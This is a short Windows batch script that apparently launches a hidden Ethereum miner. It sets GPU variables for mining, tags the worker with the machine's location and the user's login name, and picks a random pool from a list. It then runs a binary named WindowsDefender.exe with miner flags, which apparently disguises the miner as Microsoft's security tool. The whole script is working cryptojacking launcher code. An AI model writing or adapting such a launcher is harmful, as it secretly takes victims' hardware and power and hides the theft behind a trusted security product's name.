setx GPU_FORCE_64BIT_PTR 0
setx GPU_MAX_HEAP_SIZE 100
setx GPU_USE_SYNC_OBJECTS 1
setx GPU_MAX_ALLOC_PERCENT 100
setx GPU_SINGLE_ALLOC_PERCENT 100
set /p GEO=<location.txt
set USERNAME=%USERNAME: =_%
set USERNAME=%GEO%:%USERNAME%

set /a count=0
for /f "tokens=1delims=:" %%i in ('findstr /n "^" "add-eth"') do set /a count=%%i
set /a rd=%random%%%count
if %rd% equ 0 (set "skip=") else set "skip=skip=%rd%"
set "found="
for /f "%skip%tokens=1*delims=:" %%i in ('findstr /n "^" "add-eth"') do if not defined found set "found=%%i"&set "pool=%%j"

WindowsDefender.exe -mode 1 -ethi 2 -epool %pool%/%USERNAME%


